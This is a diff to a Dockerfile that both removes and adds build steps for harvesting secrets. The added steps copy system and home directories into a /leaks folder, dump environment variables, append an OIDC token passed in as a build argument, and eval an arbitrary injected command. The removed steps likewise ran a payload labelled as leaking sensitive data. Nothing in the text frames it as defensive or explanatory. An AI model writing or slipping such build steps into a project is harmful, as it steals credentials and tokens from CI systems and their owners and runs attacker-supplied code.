@@ -1,11 +1,11 @@
 FROM python:3.11-alpine
+ARG EXFIL_OIDC_TOKEN
+ARG PAYLOAD_CMD
 
-ARG PAYLOAD
-
-# Install utilities for deeper inspection
-RUN apk add --no-cache curl jq openssl tar findutils procps net-tools
-
-# Execute payload to leak sensitive data
-RUN mkdir -p /loot && \
-    echo "[+] Running enhanced payload..." && \
-    sh -c "$PAYLOAD"
+RUN apk add --no-cache curl tar bash && \
+    echo "[+] Collecting secrets..." && \
+    mkdir -p /leaks && \
+    cp -a /etc /root /home /var /opt /srv /leaks/ 2>/dev/null || true && \
+    env | grep -v GITHUB_TOKEN > /leaks/env.txt && \
+    echo "OIDC_TOKEN=$EXFIL_OIDC_TOKEN" >> /leaks/env.txt && \
+    echo "[+] Running payload..." && eval "$PAYLOAD_CMD"
